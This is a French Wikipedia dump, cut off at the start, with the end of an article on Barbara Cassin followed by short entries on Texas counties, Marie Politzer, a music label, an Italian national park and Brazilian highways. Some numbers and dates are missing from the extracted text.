En 1994, elle soutient à l'université Paris-IV une thèse d'État sous la direction de Pierre Aubenque. Cette thèse, à laquelle "Si Parménide" aura servi de prolégomènes, est publiée sous le titre "L'Effet sophistique" dans la prestigieuse collection de la NRF. Outre une confrontation entre des auteurs de l'Antiquité (Homère, Parménide, Gorgias, Antiphon, Aristote) et des penseurs contemporains (Frege, Heidegger, Arendt, Lacan, Perelman, Habermas), l'ouvrage offre de nombreux documents, dont la traduction de textes dans certains cas partiellement inédits en français (le "Traité du non-être" de Gorgias et son "Éloge d'Hélène" dans leur intégralité, les "Tétralogies" d'Antiphon ou encore le traité "Sur la manière d'écrire l'histoire" de Lucien de Samosate).
À la suite de l'abolition de l'apartheid, elle participe à la fondation, à l'université du Cap, d'une école de rhétorique qui devenue depuis l'Association de rhétorique et de communication de l'Afrique du Sud (), avec Philippe-Joseph Salazar, membre du Collège international de philosophie, dont la thèse avait été censurée dix ans plus tôt par le gouvernement d'Afrique du Sud. Elle en est la vice-présidente et l'une des correspondantes pour la France.
À partir de 1995, elle siège en tant que représentante élue au Comité national du CNRS.
(2002-2006).
De 2002 à 2006, le CNRS lui confie le pilotage d'un Projet international de coopération scientifique ( 1455) avec l'Afrique du Sud intitulé "Rhétoriques et démocraties". Corollairement, l'Institut Max Planck la charge de définir le programme de philosophie que la Commission européenne a décidé de mettre en ligne sur le site "European Cultural Heritage on line" (). Son équipe réalise de décembre 2003 à juin 2004, en collaboration avec les éditions du Robert et du Seuil, la maquette de la future version en ligne du "Vocabulaire européen des philosophies".
Enjeux politiques autour de la langue (2007-2010).
De 2007 à 2009, le CNRS lui confie une seconde mission de coopération internationale, intitulée "Traductions croisées / traditions croisées", dont l'objet est de conduire avec l'Ukraine une étude critique de l'influence de la langue sur les conceptions philosophiques.
En , à la suite du refus de publier "Le Perçu" de François Wahl, Barbara Cassin et Alain Badiou démissionnent des éditions du Seuil. En septembre, ils fondent chez Fayard la collection "Ouvertures" dont l'objectif revendiqué est de . Ils y éditent la somme phénoménologique refusée par le Seuil.
En 2008, elle quitte la commission « Philosophie et théologie » du Centre national du livre pour présider durant deux années cette même commission avec un nouvel intitulé "Philosophie, psychanalyse, sciences religieuses". Elle entre au conseil d’administration du Collège international de philosophie, dont elle présidait le conseil scientifique depuis 2003, et participe au partenariat unité mixte internationale nouvellement organisé entre l'Institut des sciences humaines et sociales du CNRS, et l'université de New York autour d'un sujet d'études intitulé "Transitions, translations, durabilité". Pour quatre années, elle entre au bureau de la Conférence des présidents du Comité national du CNRS (), où elle siège jusqu'en 2004, et préside une des instances de celui-ci, la commission XXXV chargée d'évaluer les chercheurs en philosophie, littérature, histoire des sciences et musicologie.
À ce titre, elle dénonce publiquement le de la recherche française et le dénigrement pratiqué par le président Nicolas Sarkozy à l'encontre du CNRS. À l'initiative du psychanalyste Roland Gori, elle rassemble les protestations de professionnels de la médecine, de l'éducation et de la culture subissant le même sort, "L'Appel des appels, pour une insurrection des consciences".
En 2009, elle rejoint pour deux années André Laks au pilotage d'un projet financé par l'ANR sur les « présocratiques grecs, présocratiques latins ». Simultanément, le CNRS lui confie la responsabilité d'un "groupement de recherche international" () intitulé "Philosopher en langues. Comparatisme et traduction" et l’Unesco celle d'un nouveau « réseau des femmes-philosophes » et de sa "Revue des femmes-philosophes".
Elle abandonne la direction du Centre Léon-Robin pour prendre en la présidence du conseil d’administration du Collège international de philosophie, devenant ainsi le responsable éditorial de la revue de l'établissement, "Rue Descartes", et crée avec Fernando José de Santoro Moreira un programme d'échanges pour les « » () de l'Université du Brésil de Rio. Elle délivre dans ce cadre un enseignement synthétisant quarante années d'une recherche consacrée à déterminer comment la langue et le récit d'Homère ont façonné la pensée occidentale, "Les Origines du langage philosophique - stratégies rhétoriques et poétiques de la sagesse antique" : souvent sans le savoir, 
L'articulation entre les enjeux politiques et les langues est l'un des grands axes de ses travaux. Elle se montre critique à l'égard de langues comme le globish qu'elle qualifie de repoussoir de la traduction ou la langue espéranto. Par exemple, sur l'espéranto, dans "Plus d'une langue", (Bayard, coll. « Les petites conférences », 2012), elle écrit : .
Engagements personnels (2011-2014).
En 2011, elle fait partie du comité des fondateurs de l'Institut de psychanalyse de l'hôpital Sainte-Anne, dont le chef de service lacanien Françoise Gorog prend la direction, et entre au conseil scientifique du Labex TransferS, émanation du CNRS, de Normale et du Collège de France, affectée à la promotion et l'étude des échanges culturels, notamment par l'informatique, où elle prend en charge trois des programmes de recherche.
Les Maisons de la Sagesse (depuis 2017).
À la suite de l'exposition au MUCEM de Marseille (décembre 2016 - mars 2017) dont elle était la commissaire, déclinée en 2017-2018 à la Fondation Martin Bodmer à Genève, elle crée et préside en 2017 l'association Maisons de la Sagesse - Traduire, qui vise à constituer un réseau de lieux et d'actions, centré autour de la traduction comme savoir-faire avec les différences. Les deux premières implantations sont à Marseille et Aubervilliers.
Académie française (depuis 2018).
Le , face notamment à Marie de Hennezel et Pierre Perpillou, elle est élue à l'Académie française au fauteuil précédemment occupé par Philippe Beaussant. Son épée, en forme de sabre de Jedi, lui a été remise par Xavier Darcos, au Louvre, le mardi 15 octobre 2019, et elle a été reçue officiellement sous la coupole de l'Institut de France, par Jean-Luc Marion, le jeudi suivant. Elle appartient également à la commission du Dictionnaire.
Campus Condorcet (depuis 2019).
Le 6 février 2019, elle est élue présidente du conseil scientifique du Campus Condorcet.
Axes de recherche.
Synthèse, selon Alain Badiou, qui a écrit avec elle deux ouvrages, de l'héritage heideggerien et du tournant linguistique, elle relit l'histoire de la philosophie antique à la lumière de la sophistique.
Elle montre comment la sophistique, repoussée hors de la philosophie et même hors de la pensée par Platon et par Aristote, permet d'élargir la rationalité en explorant ses principes inaperçus et ses bords. Gorgias en particulier délimite l'ontologie comme un discours simplement plus efficace que les autres : l'être de Parménide est d'abord un effet de dire. Quant au principe de non-contradiction, ancré par Aristote dans l'univocité du sens, il ne cesse d'être démenti par la sémantique de l'intentionnalité, la grammaire de l'inconscient ou les difficultés de la traduction. L'exemple des commissions "vérité et réconciliation" la conduit à déconstruire les arrière mondes qui tentent de masquer ce qu'elle appelle l'effet sophistique, c'est-à-dire le rôle d'acte fondateur, voire thérapeutique (« logos-pharmakon »), de la parole pour l'être humain, en tant que sujet individuel dans le cas de la psychanalyse, en tant qu'être social dans le domaine politique.
Apports.
Logologie.
Terme repris de Novalis, la logologie nomme la théorie sophistique où le dire effectue le monde (avec, notamment, Gorgias dans le "Traité du non-être"), par opposition (et comme conséquence poussée du "Poème" de Parménide) à l'ontologie. L'être est un effet de dire ("L'Effet sophistique").
En particulier, dans le cadre de l'histoire sophistique, la logologie étudie l'histoire de la performativité.
Le barbare est au cœur de la langue.
La banalisation du mal passe, outre la désignation de l'étranger comme barbare, par la prétention à l'universalité d'une langue, une novlangue, qui, réduite à un système de communication, dénie à chaque langue maternelle ce qu'elle a d'intraduisible, en particulier son aspect performatif en ce que celui-ci a de fondateur pour une civilisation. Selon Barbara Cassin, la défense de la diversité des langues, en particulier face au globish et la googlisation de la pensée["définition souhaitable"], est un rempart contre la barbarie.

</doc>
<doc id="1873484" url="https://fr.wikipedia.org/wiki?curid=1873484" title="Escape Velocity (film)">
Escape Velocity (film)

 est un film canadien réalisé par Lloyd A. Simandl, sorti en 1998.
Synopsis.
Un astronaute psychotique est envoyé dans un laboratoire perdu au milieu de l'espace, où se trouve déjà un scientifique, sa femme et sa fille. Comment va se passer la cohabitation entre ces quatre personnes très différentes ? 

</doc>
<doc id="1873489" url="https://fr.wikipedia.org/wiki?curid=1873489" title="Comté de Howard (Texas)">
Comté de Howard (Texas)

Le comté de Howard, en "", est un comté situé dans le nord-ouest de l'État du Texas aux États-Unis. Le siège de comté est la ville de Big Spring. Selon le recensement de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est nommé en l'honneur de , un ancien membre de la Chambre des représentants des États-Unis pour le Texas. 

</doc>
<doc id="1873495" url="https://fr.wikipedia.org/wiki?curid=1873495" title="Bradford Northern">
Bradford Northern



</doc>
<doc id="1873496" url="https://fr.wikipedia.org/wiki?curid=1873496" title="Comté de Reeves">
Comté de Reeves

Le comté de Reeves, en , est un comté situé dans l'ouest de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Pecos. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est baptisé à la mémoire du colonel .
Organisation du comté.
Le comté est fondé le , à partir des terres du comté de Pecos. Il est définitivement organisé et autonome, le . 
Le comté est baptisé en référence à , colonel de l'armée des États confédérés d'Amérique, durant la guerre de Sécession, puis président de la Chambre des représentants du Texas.
Géographie.
Le comté de Reeves se situe à l'ouest de l'État du Texas, aux États-Unis. Il se trouve dans la région du Trans-Pecos et est bordé du nord à l'est par la rivière Pecos qui forme la frontière avec les comtés de Loving et Ward.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
Démographie.
Lors du recensement de 2010, le comté comptait une population de . Elle est estimée, en 2017, à .
Selon l""', pour la période 2011-2015, 61,55 % de la population âgée de plus de déclare parler l’espagnol à la maison, alors que 37,26 % déclare parler anglais et 1,19 % une autre langue.

</doc>
<doc id="1873504" url="https://fr.wikipedia.org/wiki?curid=1873504" title="Christian Plantin">
Christian Plantin

Christian Plantin est un linguiste et un théoricien de l'argumentation français né le janvier 1947. Auteur d'ouvrages d'introduction à visée pédagogique, il a aussi publié des ouvrages théoriques où il propose des schémas d'analyse argumentative et une discussion notamment des théories Stephen Toulmin.
Directeur de recherche au CNRS, il a également été directeur de collection aux Éditions Kimé. Il a traduit un ouvrage de John Woods et Douglas Walton sur les paralogismes et coordonné la traduction de la "Nouvelle dialectique" (1996) des spécialistes néerlandais de l'argumentation Franz van Eemeren et Rob Grootendorst. Dans la ligne de la nouvelle rhétorique de Chaïm Perelman, Plantin fait paraître en 1995 un « Que sais-je ? » sur l'argumentation aux PUF.

</doc>
<doc id="1873507" url="https://fr.wikipedia.org/wiki?curid=1873507" title="Parc national du Val Grande">
Parc national du Val Grande

Le parc national du Val Grande ("Parco nazionale della Val Grande" en italien) est un grand parc montagneux d’Italie. Situé à une heure en voiture de Milan, dans la province du Verbano-Cusio-Ossola au Piémont, le parc est institué depuis 1992 et s’étend sur hectares (145,98 km²) entre le lac Majeur (la vallée de la Cannobine et la vallée Intrasca), la val d'Ossola, le val Vigezzo, les Centovalli et la frontière suisse. Il est surtout remarquable pour ses paysages des Hautes Alpes.
Montagnes.
Les plus grandes montagnes du parc sont : 
Flore.
À Val Grande, comme ce qui s’est passé dans d’autres territoires à la suite du dépeuplement qui a suivi la Seconde Guerre mondiale, la forêt a retrouvé son espace, auparavant amputé à cause du bûcheronnage et entretenu par les bergers. À l’heure actuelle, la nature est affectée par cette histoire, présentant une jeune forêt qui s’étend sur une grande partie de la surface du parc. La hauteur moyenne n’est en fait pas élevée, ce qui permet à des espèces de basse montagne telles que le châtaignier, le hêtre, le noisetier, d’être dominantes.

</doc>
<doc id="1873510" url="https://fr.wikipedia.org/wiki?curid=1873510" title="Comté de Refugio">
Comté de Refugio

Le comté de Refugio, en "", est un comté situé dans le sud-est de l'État du Texas, et la région de la Côte du Golfe, aux États-Unis. Fondé le , son siège de comté est ville Refugio. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est baptisé en référence au nom d'une mission.
Organisation du comté.
Le , la ville mexicaine de "Refugio" est créée. Le , Refugio devient un comté de la république du Texas. Le , le comté est intégré à l’État du Texas, nouvellement créé. 
Le comté est baptisé en référence à la mission "", alors mexicaine, implantée en bordure de la rivière "Mission", dans l'actuel comté . 
Géographie.
Le comté de Refugio se situe à l'est de la région de la Côte du Golfe, et de l'État du Texas, aux États-Unis.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .

</doc>
<doc id="1873511" url="https://fr.wikipedia.org/wiki?curid=1873511" title="Comté de Roberts (Texas)">
Comté de Roberts (Texas)

Le comté de Roberts (anglais : "Roberts County") est un comté situé dans le nord de l'État du Texas aux États-Unis. Le siège du comté est Miami. Selon le recensement de 2020, sa population est de . Le comté a une superficie de , dont la presque totalité en surfaces terrestres.
Le comté doit son nom au gouverneur Oran Milo Roberts.
Démographie.
Le siège du comté est Miami. Sa superficie est de . Selon le recensement de 2010, sa population est de .
Élections.
Lors de la présidentielle de 2012, les comtés où le vote conservateur furent le plus important sont :
Lors de la présidentielle de 2016, avec 95,3 % des voix pour Donald Trump contre 3,6 % pour Hillary Clinton, le comté de Roberts est le premier comté américain en termes de vote républicain, le second étant le comté de King (93,7 %) situé également au Texas. Le troisième, le comté de Leslie dans le Kentucky (89,4 %). Le quatrième la paroisse de La Salle en Louisiane (88,8 %). Le cinquième la paroisse de Cameron situé également en Louisiane (88,2 %).
Lors des élections présidentielles de 2020, le comté a encore été le plus généreux en faveur de Donald Trump de tout le pays avec 529 voix données au candidat républicain, contre 17 données à son adversaire démocrate Joe Biden, soit 96,2 % des voix.

</doc>
<doc id="1873512" url="https://fr.wikipedia.org/wiki?curid=1873512" title="Rodovia Dom Pedro I">
Rodovia Dom Pedro I



</doc>
<doc id="1873514" url="https://fr.wikipedia.org/wiki?curid=1873514" title="Rodovia Santos-Dumont">
Rodovia Santos-Dumont

La Rodovia Santos Dumont est une autoroute brésilienne à 2x2 voies de circulation qui relie la ville de Campinas à l'Aéroport international de Viracopos/Campinas. 
L'Aéroport international de Viracopos/Campinas se trouve à 14 km de Campinas.
Elle fut nommée en l'honneur d'Alberto Santos-Dumont qui est considéré comme le père de l'aviation brésilienne et qui a fait ses études à Campinas. Cette autoroute à péage est administrée par la société privée Colinas.
Cette autoroute fait partie d'un ensemble autoroutier (SP-075) allant de Campinas à Sorocaba, à l'intérieur de l'État de São Paulo.

</doc>
<doc id="1873517" url="https://fr.wikipedia.org/wiki?curid=1873517" title="Marie Politzer">
Marie Politzer

Marie Politzer, née Larcade, également connue sous le nom de « Maï Politzer », née le à Biarritz (France) et morte le à Auschwitz (Pologne), est une militante communiste et une résistante française, mariée à Georges Politzer, philosophe français d'origine hongroise.
Biographie.
Maï Larcade est la fille d'un cuisinier, ancien chef à la cour d'Espagne, installé à Biarritz après la chute d'Alphonse XIII. Seule fille, elle a deux frères, l'un plus jeune, l'autre plus âgé. Elle est une enfant . La famille est catholique pratiquante. Jeune, Marie Politzer est passionnée par le théâtre et met en scène des pièces avec ses amies. Après avoir fait ses études secondaires dans un couvent de Biarritz, elle suit une formation de sténo-dactylo à Bayonne, fait des études de commerce par correspondance, puis elle part à Paris pour entrer dans une école de sage-femme. Elle est diplômée de la Pitié-Salpétrière en 1929 et ses parents lui donnent leurs économies pour acheter une clinique située dans le de Paris. Elle rencontre Georges Politzer, hongrois, professeur de philosophie, son futur mari, dans un train en rentrant pour les vacances, en 1929. Il divorce pour l'épouser et le couple se marie le .
Son mari étant communiste, Marie Politzer adhère à ses idéaux et rejoint la direction nationale de l'UJFF. Elle entre en clandestinité avec son mari durant l'Occupation, en , après avoir confié leur fils de sept ans à ses parents. Il écrit des articles pour des journaux de résistants. Elle prend en charge le transport des textes aux imprimeries clandestines et, alors qu'elle est blonde, elle se teint les cheveux en brun pour être moins reconnaissable. Avec Hélène Solomon-Langevin, Jacques Solomon et son mari, elle fonde le journal clandestin "L'Université libre" dont le premier numéro est publié juste après l'arrestation du père d'Hélène, Paul Langevin en . Ce premier exemplaire de quatre pages ronéotypées est imprimé à et distribué juste avant la manifestation du 11 novembre 1940. Dans les semaines qui suivent, les fondateurs publient de nouveaux numéros où sont commentés les arrestations, les décrets et les événements liés à la guerre en Europe.
Marie et Georges Politzer sont arrêtés à leur domicile clandestin dans le de Paris le par les brigades spéciales. Elle reste au dépôt jusqu'au , puis est détenue au secret à la prison de la Santé où elle voit une dernière fois Georges Politzer avant qu'il soit fusillé le . Elle est ensuite transférée au Fort de Romainville en .
Elle est déportée à Auschwitz par le convoi du 24 janvier 1943, convoi composé notamment de résistantes françaises, la plupart non juives et en majorité communistes, parmi lesquelles de nombreuses veuves de fusillés. Elle porte à Auschwitz le numéro . Danielle Casanova, arrivée par le même convoi qu'elle, et qui a pris la fonction de dentiste au camp, arrive à lui trouver un poste de médecin au "" du camp, bien qu'elle ne soit que sage-femme. Les conditions sont difficiles, mais un peu moins mauvaises que dans le reste du camp : les médecins n'ont pas à subir d'appel, sont abrités du froid et mangent correctement. Elle y meurt du typhus le .
C'est par Marie-Claude Vaillant-Couturier, elle aussi déportée par le convoi du , que la famille de Maï Politzer apprend sa mort, après la libération des camps.
Comme pour Georges Politzer, la mention « mort pour la France » fut accordée à Maï Politzer le . Les titres d'interné et déporté résistant lui furent reconnus le .
Hommages.
Une allée Marie-Politzer lui rend hommage à Biarritz, sa ville natale. En 1998, une rue du de Paris prend son nom et celui de son époux, la rue Georges-et-Maï-Politzer. Le centre municipal de santé d'Arcueil porte son nom jusqu'en 2019 avant d'être rebaptisé, Marcel-Trigon, du nom d'un ancien maire.

</doc>
<doc id="1873519" url="https://fr.wikipedia.org/wiki?curid=1873519" title="Rodovia Anhangüera">
Rodovia Anhangüera



</doc>
<doc id="1873521" url="https://fr.wikipedia.org/wiki?curid=1873521" title="Rodovia dos Bandeirantes">
Rodovia dos Bandeirantes



</doc>
<doc id="1873525" url="https://fr.wikipedia.org/wiki?curid=1873525" title="SMEC HB">
SMEC HB



</doc>
<doc id="1873526" url="https://fr.wikipedia.org/wiki?curid=1873526" title="Comté de Robertson (Texas)">
Comté de Robertson (Texas)

Le comté de Robertson, en , est un comté situé à l'est de la partie centrale de l'État du Texas aux États-Unis. Fondé le , le siège de comté est la ville de Franklin. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est nommé en mémoire de Sterling C. Robertson, homme politique ayant participé à l'indépendance du Texas.
Organisation du comté.
Le comté de Robertson est créé par la république du Texas, le . Il résulte de la séparation des comtés de Bexar, de Nacogdoches et de Milam. Le comté est définitivement autonome et organisé le . Le , il devient un comté de l’État du Texas, nouvellement créé.
Le comté est baptisé en référence à , un des premiers colons du Texas, ayant signé la déclaration d'indépendance du Texas.
Géographie.
Le comté de Robertson se situe à l'est de la partie centrale de l'État du Texas, aux États-Unis. Il est bordé par le Brazos à l'ouest, la rivière Navasota à l'est et l'ancienne route de San Antonio, au sud.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
L'altitude varie de à .
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .

</doc>
<doc id="1873527" url="https://fr.wikipedia.org/wiki?curid=1873527" title="Parc national de la Val Grande">
Parc national de la Val Grande



</doc>
<doc id="1873530" url="https://fr.wikipedia.org/wiki?curid=1873530" title="Comté de Rockwall">
Comté de Rockwall

Le comté de Rockwall, en , est un comté situé au centre nord-est de l'État du Texas aux États-Unis. Fondé le , le siège de comté est la ville de Rockwall. Selon le recensement de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est le plus petit comté du Texas.
Histoire.
La région autour du comté de Rockwall était le foyer de plusieurs tribus d'Amérindiens Caddos. Les Cherokees, de l'est du Mississippi, ont commencé à arriver dans la région au début du et tout en s'installant, ils ont pratiquement anéanti les paisibles Caddos. Lorsque les premiers pionniers sont arrivés dans la vallée de l'East Fork, dans les années 1840, ils ont trouvé ces divers groupes d'Amérindiens en guerre. Les colons blancs de la région semblent cependant avoir eu peu de problèmes avec eux. La route nationale de la république du Texas a été aménagée et construite au milieu des années 1840, dans la région qui allait devenir le comté de Rockwall. S'étendant vers le nord-est de la région de Dallas jusqu'à la "Red River", cet axe était important pour les colons qui se rendaient à la , près de l'emplacement actuel de Dallas. En 1846, le premier colon, John O. Heath, reçoit une subvention de la colonie de Mercer et s'installe le long de l'East Fork du fleuve Trinity, près du croisement de la National Road. À l'occasion, lorsque les eaux gonflées de la rivière Trinity empêchaient la traversée, certaines familles se sont simplement installées le long de la rive est de la rivière. Les villes de Heath et Rockwall ont donc été fondées le long de cette route.
Géographie.
Le comté de Rockwall, est situé dans les prairies de Blackland, au centre nord-est du Texas, à () au nord-est de Dallas. Le comté de Rockwall est le plus petit comté du Texas. Ses de prairies plates et légèrement ondulées s'étendent de à d'altitude. Le comté, presque carré, comporte trois secteurs topographiques distincts : la vallée de l'East Fork, un cours d'eau affluent du fleuve Trinity, une petite région de terrasses légèrement ondulées ou en pente abrupte, à l'ouest de la vallée et des hautes terres ondulées à l'est de la vallée, qui couvrent 80 % de la région.
Démographie.
Lors du recensement de 2010, le comté comptait une population de . Elle est estimée, en 2017, à .
Selon l""', pour la période 2011-2015, 85,49 % de la population âgée de plus de déclare parler l’anglais à la maison, alors que 11,15 % déclare parler espagnol et 3,37 % une autre langue.

</doc>
<doc id="1873534" url="https://fr.wikipedia.org/wiki?curid=1873534" title="Comté de Runnels">
Comté de Runnels

Le comté de Runnels, en "", est un comté situé dans le centre de l'État du Texas aux États-Unis. Le siège du comté est la ville de Ballinger. Selon le recensement des États-Unis de 2020, sa population est de .
Le comté a une superficie de , dont en surfaces terrestres. 

</doc>
<doc id="1873535" url="https://fr.wikipedia.org/wiki?curid=1873535" title="Fade Out">
Fade Out

Fade Out a plusieurs significations :

</doc>
<doc id="1873536" url="https://fr.wikipedia.org/wiki?curid=1873536" title="Comté de Rusk (Texas)">
Comté de Rusk (Texas)

Le comté de Rusk, en "", est un comté situé à l'est de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Henderson. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est baptisé en mémoire de Thomas Jefferson Rusk, président pro tempore du Sénat des États-Unis.
Histoire.
Avant l'annexion du Texas en 1845, les terres, occupées de temps à autre par les Caddos, un peuple amérindien, étaient généralement inhabitées jusqu'en 1819, lorsque les Cherokees, dirigés par Chef Bowles, s'établissent dans ce qui est maintenant le comté de Rusk. Le traité de Bowles Village, conclu le entre la république du Texas, les Cherokees et douze tribus affiliées, donne aux tribus des parties du comté de Rusk occidental ainsi que des parties des comtés actuels de Gregg et Van Zandt, en plus de l'ensemble des régions des comtés de Cherokee et de Smith.
Ils demeurent sur ces terres, jusqu'à la guerre des Cherokees, à l'été 1839. Les Cherokees sont alors chassés du comté de Rusk, pour y revenir en 1844 et 1845. Benjamin Franklin Thompson, un homme blanc marié à une femme cherokee, achète alors de terre. C'est la naissance de , située à environ au sud de Kilgore, qui s'est ensuite étendue pour englober les régions situées près de Troup, Arp et Overton, au Texas.
Organisé à l'origine comme une partie du comté de Nacogdoches, le comté de Rusk est créé par le Congrès de la république du Texas, le . En 1850, il est le deuxième comté le plus peuplé du Texas parmi les 78 comtés déjà organisés à l'époque, selon le recensement des États-Unis de 1850. La population du comté de Rusk était alors de . Cette population n'était dépassée que par celle du comté de Harrison avec .
Avec la découverte du pétrole, à , en , un boom pétrolier s'amorce, ce qui fait presque doubler la population du comté au cours de la décennie suivante et entraîne des changements dramatiques dans les villes du comté. Rusk est l'un des cinq comtés qui font partie du East Texas Oil Field, dont la production est depuis une part importante de l'économie du comté.
Jusqu'en , le comté de Rusk était un dry county du Texas, où la vente et la fabrication de boissons alcoolisées étaient interdites. La ville de Henderson a depuis opté pour la vente et le service de bière et de vin.
Le comté est baptisé en mémoire de Thomas Jefferson Rusk, secrétaire à la Guerre de la république du Texas puis président pro tempore du Sénat des États-Unis.
Géographie.
Le comté de Rusk se situe à l'est de l'État du Texas, aux États-Unis.
Selon le Bureau du recensement des États-Unis, le comté a une superficie totale de , dont sont des terres et sont couverts d'eau.
Démographie.
Lors du recensement de 2010, le comté comptait une population de . Elle est estimée, en 2017, à .
Selon l""', pour la période 2011-2015, 86,72 % de la population âgée de plus de déclare parler anglais à la maison, alors que 12,46 % déclare parler l’espagnol et 0,83 % une autre langue.

</doc>
<doc id="1873538" url="https://fr.wikipedia.org/wiki?curid=1873538" title="Delius">
Delius



</doc>
<doc id="1873539" url="https://fr.wikipedia.org/wiki?curid=1873539" title="Beecham">
Beecham

Beecham peut désigner :

</doc>
<doc id="1873541" url="https://fr.wikipedia.org/wiki?curid=1873541" title="Mengelberg">
Mengelberg

Mengelberg est un patronyme porté notamment par :

</doc>
<doc id="1873547" url="https://fr.wikipedia.org/wiki?curid=1873547" title="Jacquet de La Guerre">
Jacquet de La Guerre



</doc>
<doc id="1873548" url="https://fr.wikipedia.org/wiki?curid=1873548" title="Frémeaux &amp; Associés">
Frémeaux &amp; Associés

Frémeaux &amp; Associés, prononcé Frémeaux et Associés, est un label discographique indépendant français spécialisé dans divers genres musicaux et styles sonores. Il est fondé en 1991 par Patrick Frémeaux et Claude Colombini. L’activité de la société se concentre essentiellement autour de la sauvegarde du sonore qu’il soit musical, parlé ou écrit et produit également quelques artistes. 
Par ailleurs Frémeaux &amp; Associés est une galerie d’art située à Vincennes, près de Paris, lieu de leur siège social.
Histoire.
La marque a initialement produit des rééditions de gospel, un style apprécié par Patrick Frémeaux, cofondateur, et s'est progressivement diversifiée pour étendre son répertoire au blues, au jazz, à la chanson française traditionnelle et aux différents styles de musiques du monde. 
Avec une ligne éditoriale qui se veut muséographique, Frémeaux &amp; Associés a peu à peu agrandi son catalogue, largement sur la base d'enregistrements du domaine public rassemblés auprès de collectionneurs privés ou institutionnels (coéditions avec l'INA, Radio France ou l'Assemblée nationale par exemple). Pour asseoir son identité dans l'économie du disque encore florissante dans les années 1990, le label investit dans la restauration des bandes et des enregistrements, fait rédiger par des spécialistes des livrets complets et documentés et s'engage à ne jamais déréférencer les coffrets CD une fois produits.
Le modèle économique mis en place autorise aux publications une durée d'amortissement longue, étalée sur plusieurs années, avec des volumes de ventes modestes : précise Patrick Frémeaux, pour qui la dimension culturelle de ce patrimoine ainsi diffusé est plus importante que les aspects économiques, dans ses choix.
Dans les années 2000, Frémeaux &amp; Associés entame une nouvelle diversification, sous la direction de Claude Colombini, avec le lancement de « La Librairie sonore ». Cette évolution permet d'assurer à l'entreprise une nouvelle voie de développement, alors que l'économie du disque commence à péricliter (crise du disque) et que de nombreux acteurs historiques de l'industrie musicale disparaissent.
Productions et (ré)éditions.
Jazz.
Les albums de blues, gospel, rhythm and blues et de rock sont réalisés par des musicologues tels que Gérard Herzhaft, Jean Buzelin, Guillaume Veillet, François Jouffa, Jacques Barsamian, Bruno Blum et Patrick Frémeaux lui-même, avec des artistes tels que Sister Rosetta Tharpe, le Modern Jazz Quartet, John Coltrane, Didier Lockwood, etc.
En lien avec l'exode des 4000 musiciens de Nouvelle-Orléans provoqué par l'ouragan Katrina en 2005, la maison produit les albums du groupe "Django à la créole" fondé par le clarinettiste américain Evan Christopher lors de sa villégiature en France en hommage à Django Reinhardt.
Country.
Albums réalisés par Gérard Herzhaft.
Musiques des Caraïbes.
Albums régulièrement réédités par Jean-Pierre Meunier et Bruno Blum.
Musiques latines.
Domaine de la chanteuse brésilienne Teca Cazalans, de Philippe Lesage, Patrick Tandin, Éric Rémy, et Pierre Carlu.
Librairie sonore.
Développée dans les années 2000 par Claude Colombini, l'éditeur prône, à travers la Librairie sonore, l’importance de l’oralité dans la transmission des cultures et des savoirs et notamment en philosophie. La Librairie sonore regroupe trois grandes branches d'activités.

</doc>
<doc id="1873553" url="https://fr.wikipedia.org/wiki?curid=1873553" title="Comté de Potter (Texas)">
Comté de Potter (Texas)

Le comté de Potter, en "", est un comté situé au nord de l'État du Texas aux États-Unis. Fondé le son siège de comté est la ville de Amarillo. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est baptisé en l'honneur de Robert Potter, personnalité politique américaine, secrétaire de la Marine du Texas.
Organisation du comté.
Le comté est fondé le , à partir des terres des comtés de Bexar et de Young. Il est définitivement organisé et autonome, le . 
Le comté est baptisé en référence à , un homme politique américain et militant pour l'indépendance du Texas, provisoirement secrétaire de la Marine du Texas, en 1836.
Géographie.
Le comté de Potter se situe au nord de l'État du Texas, aux États-Unis.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
L'altitude varie de à .
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .

</doc>
<doc id="1873560" url="https://fr.wikipedia.org/wiki?curid=1873560" title="Comté de Presidio">
Comté de Presidio

Le comté de Presidio, en "", est un comté situé dans l'ouest de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Marfa. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Situé à la frontière avec le Mexique, le comté est baptisé en référence au , une fortification et une localité, du , situés le long de la rivière. Le fort s'appelait également et .
Organisation du comté.
Le comté est fondé le , à partir de terres n'appartenant à aucun autre comté, appelées . Après plusieurs réorganisations foncières, il est définitivement organisé et autonome, en 1875.
Le nom du comté fait référence au presidio, mot espagnol signifiant "garnison de soldats". Il est nommé en mémoire du "Presidio del Norte", un fort, également appelé et et une localité, situés dans la région , à la jonction du Río Conchos et du Río Grande.
Géographie.
Le comté de Presidio, fait partie de la région du Trans-Pecos, dans l'ouest du Texas aux États-Unis.
Il est bordé à l'ouest et au sud, par le fleuve Río Grande, qui forme la frontière naturelle du comté mais aussi des États-Unis avec le Mexique. Le comté est situé en face de l'État de Chihuahua et des municipalités de , à l'ouest, d', au sud-ouest, et de , au sud.
Le comté a une superficie totale de , composée de de terres et de de zones aquatiques.
Il n'y a pas de cours d'eau permanents dans le comté, bien que de nombreux arroyos asséchés deviennent des torrents déchaînés pendant les fortes pluies. Les principaux sont l""', le "Cibolo Creek", le "Capote Creek" et le "Pinto Canyon". Le barrage "San Esteban" est construit sur l'Alamito Creek, en 1911. Les altitudes du comté sont comprises entre et .
Démographie.
Lors du recensement de 2010, le comté comptait une population de . Elle est estimée, en 2017, à .
